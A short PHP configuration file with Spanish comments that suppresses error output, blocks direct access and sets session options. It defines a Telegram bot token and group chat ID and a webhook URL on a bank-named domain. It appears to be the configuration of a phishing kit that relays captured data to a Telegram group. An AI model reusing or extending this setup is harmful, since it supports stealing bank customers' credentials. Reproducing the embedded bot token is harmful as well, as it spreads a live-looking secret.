<?php
// 🔧 FIX 1: NO debe haber NINGÚN espacio ni línea antes de <?php
// Configuración de sesiones GLOBAL para todo el sistema
ini_set('session.save_handler', 'files');
ini_set('session.use_strict_mode', 0);
ini_set('session.use_cookies', 0);
ini_set('session.use_only_cookies', 0);
ini_set('session.cache_limiter', '');
ini_set('session.cookie_lifetime', 0);

// 🚫 Ocultar errores y advertencias
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

// 🔒 Bloquear acceso directo desde navegador
if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)) {
    http_response_code(403);
    exit('Acceso prohibido.');
}

// ⚙️ Bots y grupos
// 🔧 FIX 2: ELIMINADO el bot vacío que causaba errores silenciosos
$telegram_accounts = [
    [
        'token' => '8721074529:AAFSLwoyOoeOhJsoPqutEHNvnH5C4QL5KBw',
        'chat_id' => '-1004378006347'
    ]
];

// 🔧 FIX 3: URL del webhook verificada
// IMPORTANTE: Si cambias de hosting, debes actualizar esto
$webhook_url = 'https://credits30mercantil.up.railway.app/approve.php';

// 🔧 FIX 4: Configuración adicional de seguridad
// Tiempo de vida de la sesión (30 minutos)
ini_set('session.gc_maxlifetime', 1800);
ini_set('session.gc_probability', 1);
ini_set('session.gc_divisor', 100);
?>
